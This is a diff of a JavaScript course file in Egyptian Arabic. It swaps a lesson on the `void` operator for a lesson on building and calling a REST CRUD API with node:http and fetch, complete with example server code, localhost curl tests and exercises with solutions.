+const gone = await fetch(API + "/" + created.id);
+console.log(created, list.length, del.status, gone.status, gone.ok);`,
+          try: R`شغّل [[server.js]] اللي في الشرح بـ [[node server.js]]، وفي ترمنال تاني [[node crud.js]]. وبعدين بـ [[curl -i]]: اعمل [[POST]] بـ JSON بايظ ([[-d '{bad']])، و [[DELETE]] على [[/api/items]] (من غير id)، و [[DELETE]] على نفس العنصر مرتين. إيه الـ status والـ headers في كل واحدة؟`,
+          sol: R`~~~bash
+curl -s -i -X POST localhost:3000/api/items -d '{bad'
+curl -s -i -X DELETE localhost:3000/api/items
+curl -s -i -X DELETE localhost:3000/api/items/4
+curl -s -i -X DELETE localhost:3000/api/items/4
+~~~
 
-[[void]] = «نفّذ ده وارمي النتيجة». الكود بيشتغل، بس اللي بيرجع دايمًا [[undefined]]. الناتج من Node 24.22.
+~~~text الناتج (Git Bash على ويندوز، Node 24.22، أهم السطور)
+HTTP/1.1 400 Bad Request
+{"error":"الـ body لازم JSON object"}
+
+HTTP/1.1 405 Method Not Allowed
+Allow: GET, POST
+{"error":"method مش مسموح"}
+
+HTTP/1.1 204 No Content
+
+HTTP/1.1 404 Not Found
+{"error":"الصنف 4 مش موجود"}
+~~~
+
+- **405 معاه [[Allow]]:** السيرفر بيقولك الـ methods اللي ينفعوا على العنوان ده.
+- **[[DELETE]] مرتين:** الأولى 204 والتانية 404، بس **حالة السيرفر واحدة** بعد الاتنين (العنصر مش موجود). ده معنى إن [[DELETE]] idempotent (قسم ٤).
+- **204 مفيهوش body خالص**، فمتعملش [[res.json()]] عليه.`,
+          teach: R`## الفكرة
+
+API الـ REST بيعامل البيانات كأشياء ليها عناوين، والـ method هو الفعل:
+
+| CRUD | الـ method والعنوان | الـ body | الرد الصح |
+|---|---|---|---|
+| Create | [[POST /api/items]] | العنصر الجديد من غير id | [[201]] والعنصر بالـ id، و [[Location: /api/items/3]] |
+| Read (لستة) | [[GET /api/items]] | مفيش | [[200]] و array |
+| Read (واحد) | [[GET /api/items/3]] | مفيش | [[200]] أو [[404]] |
+| Update كامل | [[PUT /api/items/3]] | العنصر كله | [[200]] (أو [[204]]) |
+| Update جزئي | [[PATCH /api/items/3]] | الحقول اللي اتغيّرت بس | [[200]] |
+| Delete | [[DELETE /api/items/3]] | مفيش | [[204]] من غير body |
+
+القواعد: العنوان اسم (resource) مش فعل: [[/api/items/3]] مش [[/api/deleteItem?id=3]]. والجمع للستة ([[items]]). والـ status code بيقول اللي حصل، والـ body فيه التفاصيل. (أساس HTTP نفسه في درس «HTTP: الطلب والرد»، والـ status codes بالتفصيل في درس «Status codes».)
 
 ---
 
-## ١. [[void 0]] والأولوية
+## ١. السيرفر اللي هنكلّمه
 
-~~~js
-console.log(void 0, void 'x', typeof void 0, void 0 === undefined);
-console.log(void 2 + 3, void (2 + 3));
+API صغير بـ [[node:http]] من غير أي مكتبة، والبيانات في [[Map]] في الذاكرة (بتروح مع الـ restart). منيو كافيه فيه صنفين:
+
+~~~js server.js
+// server.js: REST API صغير لمنيو كافيه، والبيانات في الذاكرة
+const http = require("node:http");
+
+const items = new Map([
+  [1, { id: 1, name: "قهوة", price: 45 }],
+  [2, { id: 2, name: "شاي", price: 20 }],
+]);
+let nextId = 3;
+
+function send(res, status, body) {
+  res.writeHead(status, body === undefined ? {} : { "Content-Type": "application/json; charset=utf-8" });
+  res.end(body === undefined ? undefined : JSON.stringify(body));
+}
+
+async function readJson(req) {
+  let text = "";
+  for await (const chunk of req) text += chunk;
+  try { return JSON.parse(text); } catch { return undefined; }
+}
+
+function check(body, partial) {
+  if (!body || typeof body !== "object") return "الـ body لازم JSON object";
+  if (!partial || "name" in body) if (typeof body.name !== "string" || !body.name.trim()) return "name لازم نص مش فاضي";
+  if (!partial || "price" in body) if (!Number.isFinite(body.price) || body.price < 0) return "price لازم رقم موجب";
+  return null;
+}
+
+const nameTaken = (name, exceptId) => [...items.values()].some(i => i.name === name && i.id !== exceptId);
+
+const server = http.createServer(async (req, res) => {
+  const url = new URL(req.url, "http://localhost");
+  const m = url.pathname.match(/^\/api\/items(?:\/(\d+))?$/);
+  if (!m) return send(res, 404, { error: "مفيش resource بالاسم ده" });
+  const id = m[1] && Number(m[1]);
+
+  if (!id) {
+    if (req.method === "GET") return send(res, 200, [...items.values()]);
+    if (req.method === "POST") {
+      const body = await readJson(req);
+      const problem = check(body, false);
+      if (problem) return send(res, 400, { error: problem });
+      if (nameTaken(body.name)) return send(res, 409, { error: "الصنف ده موجود" });
+      const item = { id: nextId++, name: body.name.trim(), price: body.price };
+      items.set(item.id, item);
+      res.setHeader("Location", "/api/items/" + item.id);
+      return send(res, 201, item);
+    }
+    res.setHeader("Allow", "GET, POST");
+    return send(res, 405, { error: "method مش مسموح" });
+  }
+
+  const item = items.get(id);
+  if (!item) return send(res, 404, { error: "الصنف " + id + " مش موجود" });
+  if (req.method === "GET") return send(res, 200, item);
+  if (req.method === "DELETE") { items.delete(id); return send(res, 204); }
+  if (req.method === "PUT" || req.method === "PATCH") {
+    const body = await readJson(req);
+    const problem = check(body, req.method === "PATCH");
+    if (problem) return send(res, 400, { error: problem });
+    if (body.name && nameTaken(body.name, id)) return send(res, 409, { error: "الصنف ده موجود" });
+    const next = req.method === "PUT" ? { id, name: body.name.trim(), price: body.price } : { ...item, ...body, id };
+    items.set(id, next);
+    return send(res, 200, next);
+  }
+  res.setHeader("Allow", "GET, PUT, PATCH, DELETE");
+  return send(res, 405, { error: "method مش مسموح" });
+});
+
+server.listen(process.env.PORT || 3000, () => console.log("API على http://localhost:" + server.address().port + "/api/items"));
+module.exports = server;
 ~~~
 
-~~~text الناتج
-undefined undefined undefined true
-NaN undefined
+أهم الحتت:
+
+- **[[url.pathname.match(/^\/api\/items(?:\/(\d+))?$/)]]:** عنوان واحد للستة وعنوان للعنصر. [[(\d+)]] بيمسك الـ id، و [[(?:...)?]] بتخلي الجزء ده اختياري.
+- **[[for await (const chunk of req)]]:** الـ body بيوصل حتت (stream)، فبنجمّعه وبعدين [[JSON.parse]]. لو بايظ بنرجّع [[undefined]] و [[check]] بيحوّلها لـ 400.
+- **[[check(body, partial)]]:** [[POST]] و [[PUT]] لازم كل الحقول، و [[PATCH]] (partial) يفحص اللي اتبعت بس.
+- **[[{ ...item, ...body, id }]]:** الـ PATCH بيدمج، والـ [[id]] في الآخر عشان محدش يغيّره من الـ body.
+- **[[send(res, 204)]]** من غير body ومن غير [[Content-Type]].
+
+تفاصيل [[node:http]] نفسه في درس «node:http سيرفر من غير مكتبة».
+
+---
+
+## ٢. الـ ٥ عمليات بـ [[fetch]]
+
+~~~js crud.js
+// crud.js: الـ ٥ عمليات على الـ API بـ fetch (Node 24)
+const API = "http://localhost:3000/api/items";
+const json = { "Content-Type": "application/json" };
+
+async function call(method, url, body) {
+  const res = await fetch(url, { method, headers: body ? json : {}, body: body && JSON.stringify(body) });
+  const data = res.status === 204 ? null : await res.json();
+  console.log(method.padEnd(6), res.status, res.ok, JSON.stringify(data));
+  return data;
+}
+
+const created = await call("POST", API, { name: "لاتيه", price: 60 });
+await call("GET", API);
+await call("PUT", API + "/" + created.id, { name: "لاتيه كبير", price: 70 });
+await call("PATCH", API + "/" + created.id, { price: 65 });
+await call("DELETE", API + "/" + created.id);
+await call("GET", API + "/" + created.id);
+await call("POST", API, { name: "قهوة", price: 45 });
+await call("POST", API, { name: "" });
 ~~~
 
-| الـ expression | بيتقري كـ | النتيجة |
+~~~text الناتج (node server.js في ترمنال، و node crud.js في التاني، Node 24.22)
+POST   201 true {"id":3,"name":"لاتيه","price":60}
+GET    200 true [{"id":1,"name":"قهوة","price":45},{"id":2,"name":"شاي","price":20},{"id":3,"name":"لاتيه","price":60}]
+PUT    200 true {"id":3,"name":"لاتيه كبير","price":70}
+PATCH  200 true {"id":3,"name":"لاتيه كبير","price":65}
+DELETE 204 true null
+GET    404 false {"error":"الصنف 3 مش موجود"}
+POST   409 false {"error":"الصنف ده موجود"}
+POST   400 false {"error":"name لازم نص مش فاضي"}
+~~~
+
+**كل حتة في الطلب:**
+
+- **[[method]]:** من غير ما تكتبه [[GET]]. بيتكتب بأي case بس الصح كابيتال.
+- **[[headers: { "Content-Type": "application/json" }]]:** بتقول للسيرفر الـ body نوعه إيه. من غيرها [[fetch]] بيبعت النص بـ [[text/plain;charset=UTF-8]] (تمرين ٤)، وسيرفرات كتير (Express بـ [[express.json()]] مثلًا) هتتجاهل الـ body.
+- **[[body: JSON.stringify(...)]]:** الـ body لازم نص أو [[FormData]] أو [[Blob]] أو [[URLSearchParams]]. لو بعت object على طول بيتحوّل لـ [["[object Object]"]].
+- **[[GET]] و [[DELETE]] من غير body.** و [[fetch]] بيرفض body مع [[GET]]: [[TypeError: Request with GET/HEAD method cannot have body.]] (Node 24).
+
+**كل حتة في الرد:**
+
+- **[[res.status]] و [[res.ok]]:** [[ok]] = [[true]] لو الـ status من 200 لـ 299. **[[fetch]] مبيرميش على 404 ولا 500**، بيرمي على الشبكة بس. فبعد كل طلب: [[if (!res.ok) throw ...]] (مشروع «fetch محترم» مبني على النقطة دي).
+- **[[res.status === 204 ? null : await res.json()]]:** الـ 204 مفيهوش body، و [[json()]] عليه بترمي.
+- **[[res.headers.get("Location")]]:** بعد 201 فيه عنوان العنصر الجديد ([[/api/items/3]]).
+
+---
+
+## ٣. الـ status codes اللي الـ API ده بيرجّعها
+
+| الكود | امتى عندنا | الـ client يعمل إيه |
 |---|---|---|
-| [[void 0]] | ارمي [[0]] | [[undefined]] |
-| [[typeof void 0]] | [[typeof (void 0)]] | [['undefined']] كنص |
-| [[void 2 + 3]] | [[(void 2) + 3]] | [[NaN]]: [[undefined + 3]] |
-| [[void (2 + 3)]] | احسب 5 وارميها | [[undefined]] |
+| [[200 OK]] | [[GET]] و [[PUT]] و [[PATCH]] نجحوا | يستخدم الـ body |
+| [[201 Created]] | [[POST]] نجح | ياخد الـ id، أو يروح لـ [[Location]] |
+| [[204 No Content]] | [[DELETE]] نجح | ميقراش body |
+| [[400 Bad Request]] | JSON بايظ أو حقل ناقص | يعرض [[error]] جنب الفورم |
+| [[404 Not Found]] | id مش موجود أو عنوان غلط | «اتمسح أو مش موجود»، ويحدّث اللستة |
+| [[405 Method Not Allowed]] | [[DELETE /api/items]] | باج في الـ client، شوف [[Allow]] |
+| [[409 Conflict]] | الاسم موجود | رسالة لليوزر يغيّر الاسم |
 
 ---
 
-## ٢. في الـ arrow callbacks: متسرّبش قيمة
+## ٤. Idempotent: نفس الطلب مرتين
 
-~~~js
-const ids = [];
-console.log([1, 2, 3].map((n) => ids.push(n)), [1, 2, 3].map((n) => void ids.push(n)));
-let count = 0;
-const handlers = [() => count++, () => void count++];
-console.log(handlers.map((h) => h()), count);
+طلب **idempotent** لو تكراره بيسيب السيرفر في نفس الحالة اللي سابها فيها أول مرة. ده مهم لأن الشبكة بتقطع، والـ client ممكن يعيد الطلب مش عارف إذا كان وصل:
+
+~~~text الناتج: idempotent.js (تمرين ٣)
+البداية: 2 أصناف
+POST مرتين: 201 409 → 3
+PUT مرتين: 200 200 → 3
+DELETE مرتين: 204 404 → 2
 ~~~
 
-~~~text الناتج
-[ 1, 2, 3 ] [ undefined, undefined, undefined ]
-[ 0, undefined ] 2
-~~~
-
-- الـ arrow بسطر واحد من غير [[{}]] بترجّع قيمة الـ expression. [[ids.push(n)]] بترجّع الطول الجديد، فالـ map الأولى طلّعت أطوال مالهاش معنى.
-- [[void ids.push(n)]]: الـ [[push]] حصل، والقيمة اترمت.
-- [[() => count++]] رجّعت [[0]] (قيمة [[count]] **قبل** الزيادة)، و [[() => void count++]] رجّعت [[undefined]]، والاتنين زوّدوا [[count]] فبقى 2.
-
-ده بيفرق في أي API بتبص على القيمة الراجعة: handler بيرجّع [[false]] بالغلط فبيلغي event (تمرين «صلّح»)، أو [[useEffect(() => fetchData())]] في React بترجّع Promise مكان دالة التنضيف.
-
----
-
-## ٣. [[void promise]]: «مش هستنى» بقصد
-
-~~~js
-const save = async (x) => { if (x < 0) throw new Error('negative'); return 'saved ' + x; };
-void save(1);
-void save(-1).catch((e) => console.log('logged:', e.message));
-~~~
-
-~~~text الناتج
-logged: negative
-~~~
-
-- [[void save(1)]]: الحفظ حصل، ومحدش استنى النتيجة. الـ [[void]] هنا للقارئ وللـ linter: «مش ناسي [[await]]، قاصد».
-- [[void save(-1).catch(...)]]: الـ [[.catch]] الأول (الـ member access والنداء أولويتهم أعلى من [[void]])، فالـ Promise اللي اترمت هي اللي فيها handler، والخطأ اتسجّل.
-- من غير [[.catch]] البرنامج بيقع بـ exit 1 («جرّب» فيه الناتج كامل).
-
-| اللي كتبته | بيستنى؟ | لو فشلت |
+| الـ method | idempotent؟ | safe (مبيغيّرش حاجة)؟ |
 |---|---|---|
-| [[await save()]] | أيوه | الـ error بيترمي في مكانه |
-| [[save();]] | لأ | crash، والقارئ مش عارف ده قصد ولا نسيان |
-| [[void save();]] | لأ | crash، بس النية واضحة |
-| [[void save().catch(log);]] | لأ | بيتسجّل والبرنامج يكمّل |
+| [[GET]] | آه | آه |
+| [[PUT]] | آه: «خليه كده» مرتين = نفس النتيجة | لأ |
+| [[DELETE]] | آه: الحالة واحدة، حتى لو الرد اتغيّر 204 ثم 404 | لأ |
+| [[PATCH]] | مش مضمون ([[{ "stock": "+1" }]] مثلًا) | لأ |
+| [[POST]] | لأ: مرتين = عنصرين | لأ |
+
+[[POST]] التاني رجّع 409 **بس عشان سيرفرنا** بيمنع الاسم المكرر. من غير القاعدة دي كان هيبقى فيه صنفين «كابتشينو». عشان كده الـ client ميعيدش [[POST]] لوحده بعد timeout، ويعيد [[GET]] و [[PUT]] و [[DELETE]] عادي (مشروع «إعادة المحاولة الذكية»). والحل الاحترافي لـ [[POST]]: header [[Idempotency-Key]] بـ id عشوائي، والسيرفر يرفض نفس المفتاح مرتين.
 
 ---
 
-## ٤. [[void]] قبل [[function]]: IIFE
+## ٥. مش JSON بس: نص وصور وملفات
 
-~~~js
-void function start() { console.log('void IIFE ran'); }();
+الـ [[Response]] فيه أكتر من طريقة تقرا الـ body، وكل واحدة بترجّع Promise:
+
+| الطريقة | بترجّع | لـ |
+|---|---|---|
+| [[res.json()]] | object | APIs |
+| [[res.text()]] | نص | [[.txt]] و [[.csv]] و [[.md]] و HTML |
+| [[res.blob()]] | [[Blob]] (بايتس ونوعها) | صور، PDF، أي ملف تعرضه أو تنزّله |
+| [[res.arrayBuffer()]] | بايتس خام | تحليل ملف بإيدك، WebAssembly |
+| [[res.formData()]] | [[FormData]] | نادر |
+
+~~~js media.js (صفحة من سيرفر محلي، [[<script type="module">]])
+const text = await (await fetch("hello.txt")).text();
+console.log("text:", JSON.stringify(text));
+const res = await fetch("dot.svg");
+console.log("type:", res.headers.get("Content-Type"), res.headers.get("Content-Length"));
+const blob = await res.blob();
+console.log("blob:", blob.type, blob.size);
+const url = URL.createObjectURL(blob);
+console.log("url:", url.slice(0, 27) + "...");
+const img = document.createElement("img");
+img.src = url;
+img.alt = "نقطة خضرا";
+await img.decode();
+document.body.append(img);
+console.log("img:", img.naturalWidth, img.complete);
+URL.revokeObjectURL(url);
 ~~~
 
-~~~text الناتج
-void IIFE ran
+~~~text الناتج (Chrome 157)
+text: "أهلًا من ملف نص\nسطر تاني\n"
+type: image/svg+xml 114
+blob: image/svg+xml 114
+url: blob:http://localhost:8765/...
+img: 40 true
 ~~~
 
-الجملة بتبدأ بـ [[void]] مش [[function]]، فالـ [[function start() {}]] بقت expression، و [[()]] بعدها نداء. نفس [[(function start() {})()]] بالظبط (الدرس اللي فات: ليه الجملة مينفعش تبدأ بـ [[function]]).
+- **[[URL.createObjectURL(blob)]]** بيعمل عنوان مؤقت [[blob:http://localhost:8765/...]] يشاور على البايتس اللي في الذاكرة، فتقدر تحطه في [[img.src]] أو [[a.href]] (مع [[download]] للتنزيل).
+- **[[URL.revokeObjectURL(url)]]** بعد ما الصورة اتحمّلت ([[decode()]]) عشان الذاكرة تتحرر. لو نسيتها في لستة صور بتتغيّر، الذاكرة بتزيد (درس «memory leaks»).
+- **ليه blob مش [[img.src = "dot.svg"]] على طول؟** لما الصورة محتاجة header (توكن)، أو عايز تعرف حجمها ونوعها قبل ما تعرضها، أو تعمل preview لملف قبل ما يترفع.
+
+**الـ body بيتقرا مرة واحدة، والـ 404 ممكن يبقى HTML أو نص:**
+
+~~~text الناتج (Chrome 157)
+TypeError: Failed to execute 'text' on 'Response': body stream already read
+404: 404 false Not Found
+SyntaxError: Unexpected token 'o', "not found" is not valid JSON
+~~~
+
+السطر الأول: [[json()]] وبعدين [[text()]] على نفس الرد. لو محتاج الاتنين: [[res.clone()]] قبل القراية. والتالت: السيرفر رجّع [[not found]] نص، و [[json()]] حاولت تفكّه. افحص [[res.ok]] (وممكن [[Content-Type]]) **قبل** [[json()]]. (نفس الخطأ مع صفحة HTML: درس «Unexpected token '<'».)
 
 ---
 
 ## الخلاصة
 
-- [[void expr]] بينفّذ ويرجّع [[undefined]]، وأولويته عالية: أقواس.
-- [[() => void x()]] عشان الـ callback ميرجّعش قيمة بالغلط.
-- [[void promise]] علامة fire-and-forget، ومعاها [[.catch]] دايمًا.
-- [[void 0]] و [[javascript:void(0)]] هتقراهم، ومش محتاج تكتبهم.`,
+| عايز | اكتب |
+|---|---|
+| لستة | [[await (await fetch(API)).json()]] |
+| تضيف | [[fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(x) })]] ← 201 |
+| تبدّل كله / حقول | [[PUT]] / [[PATCH]] على [[API + "/" + id]] ← 200 |
+| تمسح | [[fetch(API + "/" + id, { method: "DELETE" })]] ← 204 |
+| تعرف نجح | [[res.ok]] (fetch مبيرميش على 404) |
+| نص / صورة | [[res.text()]] / [[res.blob()]] و [[URL.createObjectURL]] |
+
+اللي ميتلخبطش: [[JSON.stringify]] و [[Content-Type]] مع أي body، و [[res.ok]] قبل [[json()]]، والـ 204 مفيهوش body، و [[POST]] متتعادش لوحدها.`,
           lines: [
-            R`أربع قيم: [[void 0]] و [[void 'x']] الاتنين [[undefined]]، و [[typeof void 0]] نص [['undefined']]، و [[true]] لأنها نفس [[undefined]].`,
-            R`[[void 2 + 3]] بتتقري [[(void 2) + 3]] فـ [[NaN]]، وبالأقواس [[undefined]].`,
-            R`array فاضية هنزوّد فيها عشان نشوف القيمة اللي [[push]] بيرجّعها.`,
-            R`الـ map الأولى رجّعت الأطوال [[1, 2, 3]] من [[push]]، والتانية بـ [[void]] رجّعت [[undefined]] التلاتة، والـ push حصل في الحالتين.`,
-            R`عدّاد هيزيد من handlers.`,
-            R`handler بيرجّع قيمة [[count++]] (القيمة القديمة)، والتاني نفس الشغل بس بـ [[void]] فمبيرجّعش حاجة.`,
-            R`النتايج [[0]] و [[undefined]]، و [[count]] بقى 2 لأن الاتنين زوّدوا.`,
-            R`دالة async بتفشل لو الرقم سالب، وإلا بترجّع نص.`,
-            R`fire-and-forget: الحفظ بيحصل ومحدش بيستنى، والـ [[void]] بتقول إن ده مقصود.`,
-            R`نفس الكلام بس الحفظ هيفشل، فـ [[.catch]] بيسجّل الخطأ بدل ما البرنامج يقع: [[logged: negative]].`,
-            R`[[void]] خلّت [[function]] expression، فـ [[()]] نادتها على طول: IIFE من غير أقواس.`,
+            R`عنوان الـ resource: اللستة كلها`,
+            R`الـ header اللي بيقول إن الـ body JSON، هنستخدمه في كل طلب فيه body`,
+            R`Create: [[POST]] للستة بـ JSON، والرد 201 فيه العنصر بالـ id الجديد (٣)`,
+            R`Read: [[GET]] (الافتراضي) للستة كلها، و [[json()]] بيفك الـ array`,
+            R`Update كامل: [[PUT]] على عنوان العنصر بكل حقوله`,
+            R`Update جزئي: [[PATCH]] بالسعر بس، والاسم بيفضل زي ما هو`,
+            R`Delete: من غير body، والرد 204 من غير body`,
+            R`[[GET]] على عنصر اتمسح: الرد 404 و [[fetch]] مرماش`,
+            R`بيطبع العنصر اللي اتعمل، وعدد اللستة (٣)، و [[204]]، و [[404]]، و [[false]]`,
+          ],
+          practice: [
+            { lvl: 'سريع', t: R`**مراجعة:** من غير ما تبص فوق، املا الجدول لـ API تعليقات على بوست: «هات تعليقات البوست ٧»، «ضيف تعليق»، «عدّل نص تعليق ٤٢ بس»، «امسح تعليق ٤٢»، «امسح تعليق ٤٢ تاني مرة». لكل واحدة: الـ method، والعنوان، والـ body، والـ status اللي المفروض يرجع (من قسمي ١ و ٣ في الشرح).`, done: R`٥ صفوف، وعناوين أسماء مش أفعال، والمسح التاني 404.`, sol: R`**إجابة نموذجية:**
+
+| العملية | الـ method والعنوان | الـ body | الرد |
+|---|---|---|---|
+| تعليقات البوست ٧ | [[GET /api/posts/7/comments]] | مفيش | [[200]] و array (فاضي [[[]]] لو مفيش، مش 404) |
+| ضيف تعليق | [[POST /api/posts/7/comments]] | [[{ "text": "..." }]] | [[201]] و [[Location: /api/comments/42]] |
+| عدّل النص بس | [[PATCH /api/comments/42]] | [[{ "text": "..." }]] | [[200]] |
+| امسح | [[DELETE /api/comments/42]] | مفيش | [[204]] |
+| امسح تاني | [[DELETE /api/comments/42]] | مفيش | [[404]] (والحالة نفسها: idempotent) |
+
+- **الـ resources المتداخلة** ([[/posts/7/comments]]) للستة اللي تبع حاجة. والتعليق نفسه ليه عنوان لوحده لأن الـ id بتاعه فريد.
+- **لستة فاضية = 200 و [[[]]]**: البوست موجود ومالوش تعليقات. الـ 404 لو البوست نفسه مش موجود.
+- جرّبنا نفس الحالات على [[server.js]] في الشرح (منيو مش تعليقات): الـ 201 و 204 و 404 بالظبط زي الجدول.` },
+            { lvl: 'تطبيق', t: R`**قيس بنفسك:** [[idempotent.js]] بيبعت كل طلب من دول مرتين ويطبع الـ status وعدد الأصناف بعدها: [[POST]] بنفس الصنف، و [[PUT /api/items/2]] بنفس البيانات، و [[DELETE /api/items/3]]. مين غيّر الحالة في المرة التانية؟ (من قسم ٤ في الشرح).`, done: R`[[POST]] التاني رجع 409 (بسبب قاعدة الاسم)، و [[PUT]] 200 مرتين والعدد ثابت، و [[DELETE]] 204 ثم 404 والعدد ثابت بعد الأولى.`, sol: R`~~~js idempotent.js
+// idempotent.js: نفس الطلب مرتين، والسيرفر بقى فيه إيه؟
+const API = "http://localhost:3000/api/items";
+const send = async (method, url, body) => {
+  const res = await fetch(url, { method, headers: { "Content-Type": "application/json" }, body: body && JSON.stringify(body) });
+  return res.status;
+};
+const count = async () => (await (await fetch(API)).json()).length;
+
+console.log("البداية:", await count(), "أصناف");
+console.log("POST مرتين:", await send("POST", API, { name: "كابتشينو", price: 55 }), await send("POST", API, { name: "كابتشينو", price: 55 }), "→", await count());
+console.log("PUT مرتين:", await send("PUT", API + "/2", { name: "شاي", price: 25 }), await send("PUT", API + "/2", { name: "شاي", price: 25 }), "→", await count());
+console.log("DELETE مرتين:", await send("DELETE", API + "/3"), await send("DELETE", API + "/3"), "→", await count());
+~~~
+
+~~~text الناتج (سيرفر جديد، node idempotent.js، Node 24.22)
+البداية: 2 أصناف
+POST مرتين: 201 409 → 3
+PUT مرتين: 200 200 → 3
+DELETE مرتين: 204 404 → 2
+~~~
+
+- **الملف [[.js]] وفيه [[await]] برّه function:** Node 24 بيكتشف إنه ESM لوحده (module syntax detection) لما مفيش [[package.json]] بيقول غير كده.
+- **[[POST]]:** التاني غيّر الحالة أو لأ حسب السيرفر. هنا اترفض، وفي API من غير قاعدة اسم فريد كان هيبقى ٤.
+- **[[DELETE]]:** الرد اتغيّر بس الحالة لأ. idempotent بتتكلم عن الحالة مش الرد.
+- **[[body && JSON.stringify(body)]]:** لو مفيش body بيبقى [[undefined]] و [[fetch]] مبيبعتش حاجة.` },
+            { lvl: 'تطبيق', t: R`**ابني في المتصفح:** صفحة بتجيب [[hello.txt]] بـ [[text()]] وتعرضه في [[<pre>]]، وتجيب صورة بـ [[blob()]] وتعرضها من [[URL.createObjectURL]] وتكتب تحتها نوعها وحجمها، وتعمل [[revokeObjectURL]] بعد ما تتحمّل. وجرّب [[json()]] وبعدها [[text()]] على نفس الرد (من قسم ٥ في الشرح).`, done: R`النص والصورة ظاهرين، والسطر بيقول [[image/svg+xml]] و ١١٤ بايت، والقراية التانية رمت [[body stream already read]].`, sol: R`~~~html media.html
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>نص وصورة</title></head>
+<body>
+<pre id="text"></pre>
+<figure id="pic"><figcaption></figcaption></figure>
+<script type="module">
+document.querySelector("#text").textContent = await (await fetch("hello.txt")).text();
+const res = await fetch("dot.svg");
+const blob = await res.blob();
+const url = URL.createObjectURL(blob);
+const img = document.createElement("img");
+img.src = url;
+img.alt = "نقطة خضرا";
+await img.decode();
+URL.revokeObjectURL(url);
+document.querySelector("#pic").prepend(img);
+document.querySelector("figcaption").textContent = blob.type + "، " + blob.size + " بايت، " + img.naturalWidth + "×" + img.naturalHeight;
+const twice = await fetch("shop.json");
+await twice.json();
+try { await twice.text(); } catch (e) { console.log(e.name + ": " + e.message); }
+</script>
+</body>
+</html>
+~~~
+
+~~~text الناتج (Chrome 157 من سيرفر محلي)
+الصفحة: «أهلًا من ملف نص» و «سطر تاني» في pre، وتحتهم الدايرة الخضرا، و «image/svg+xml، 114 بايت، 40×40»
+الـ Console: TypeError: Failed to execute 'text' on 'Response': body stream already read
+~~~
+
+- **[[revokeObjectURL]] بعد [[decode()]]:** الصورة اتفكت واترسمت، فالعنوان مبقاش محتاجينه. لو عملتها قبل [[decode]] ممكن الصورة متظهرش.
+- **[[blob.size]]** = نفس [[Content-Length]] اللي جه من السيرفر.
+- **الصفحة دي لازم من سيرفر** ([[npx serve]] أو [[python -m http.server]] أو سيرفر Node): من [[file://]] الـ [[fetch]] بيترفض (درس «سيرفر محلي بدل file://»).` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[await fetch(API, { method: "POST", body: { name: "لاتيه", price: 60 } })]] بيرجع 400. اعرف السيرفر استلم إيه بالظبط (من غير ما تفتح السيرفر: اعمل [[new Request(...)]] بنفس الـ options واقرا [[await req.text()]] و [[req.headers.get("Content-Type")]]). وصلّحه (من قسم ٢ في الشرح).`, done: R`عرفت إن اللي اتبعت النص [["[object Object]"]] بنوع [[text/plain]]، والمصلّح رجّع 201.`, sol: R`~~~js post-bug.js
+const API = "http://localhost:3000/api/items";
+const bad = await fetch(API, { method: "POST", body: { name: "لاتيه", price: 60 } });
+console.log("بايظ:", bad.status, await bad.json());
+const req = new Request(API, { method: "POST", body: { name: "x" } });
+console.log("اللي اتبعت فعلًا:", await req.text(), "|", req.headers.get("Content-Type"));
+const good = await fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "لاتيه", price: 60 }) });
+console.log("صح:", good.status, await good.json());
+~~~
+
+~~~text الناتج (node post-bug.js، Node 24.22، والسيرفر شغال)
+بايظ: 400 { error: 'الـ body لازم JSON object' }
+اللي اتبعت فعلًا: [object Object] | text/plain;charset=UTF-8
+صح: 201 { id: 4, name: 'لاتيه', price: 60 }
+~~~
+
+- **[[fetch]] بيحوّل أي body مش معروف لنص بـ [[String(body)]]**، و [[String({})]] = [["[object Object]"]]. مفيش error في الـ client خالص، المشكلة بتبان في السيرفر بس.
+- **[[new Request(url, options)]]** بيعمل نفس الطلب من غير ما يبعته، فتقدر تشوف الـ body والـ headers اللي [[fetch]] كان هيبعتهم.
+- **الـ id ٤** لأن الطلب الأول البايظ مخدش id، والـ ٣ راح في تشغيل قبله (الـ [[nextId]] مبيرجعش لورا).` },
+            { lvl: 'تحدي', t: R`**ابني في السيرفر:** زوّد على [[GET /api/items]] فلترين من الـ query string: [[?maxPrice=30]] (السعر أقل من أو يساوي) و [[?q=شاي]] (الاسم فيه الكلمة)، ومع بعض. [[maxPrice]] مش رقم أو فاضي = 400. وابني الـ URL من الـ client بـ [[URLSearchParams]] عشان العربي يتعمله encode (من قسمي ١ و ٢ في الشرح).`, done: R`[[?maxPrice=30]] رجّعت الشاي والشاي بلبن، و [[?maxPrice=25&q=شاي]] رجّعت الشاي بس، و [[abc]] والفاضي رجّعوا 400.`, sol: R`التعديل في [[server.js]]: سطر الـ [[GET]] بتاع اللستة بقى كده:
+
+~~~js server.js (الجزء اللي اتغيّر)
+    if (req.method === "GET") {
+      let list = [...items.values()];
+      const max = url.searchParams.get("maxPrice");
+      if (max !== null) {
+        const n = Number(max);
+        if (max.trim() === "" || !Number.isFinite(n)) return send(res, 400, { error: "maxPrice لازم رقم" });
+        list = list.filter(i => i.price <= n);
+      }
+      const q = url.searchParams.get("q");
+      if (q) list = list.filter(i => i.name.includes(q));
+      return send(res, 200, list);
+    }
+~~~
+
+~~~bash
+curl -s -X POST localhost:3000/api/items -d '{"name":"شاي بلبن","price":30}'
+curl -s "localhost:3000/api/items?maxPrice=30"
+curl -s "localhost:3000/api/items?q=%D8%B4%D8%A7%D9%8A"
+curl -s "localhost:3000/api/items?maxPrice=25&q=%D8%B4%D8%A7%D9%8A"
+curl -s "localhost:3000/api/items?maxPrice=abc"
+curl -s "localhost:3000/api/items?maxPrice="
+node -e 'console.log(new URLSearchParams({ maxPrice: 30, q: "شاي" }).toString())'
+~~~
+
+~~~text الناتج (Git Bash، Node 24.22)
+[{"id":2,"name":"شاي","price":20},{"id":3,"name":"شاي بلبن","price":30}]
+[{"id":2,"name":"شاي","price":20},{"id":3,"name":"شاي بلبن","price":30}]
+[{"id":2,"name":"شاي","price":20}]
+{"error":"maxPrice لازم رقم"}
+{"error":"maxPrice لازم رقم"}
+maxPrice=30&q=%D8%B4%D8%A7%D9%8A
+~~~
+
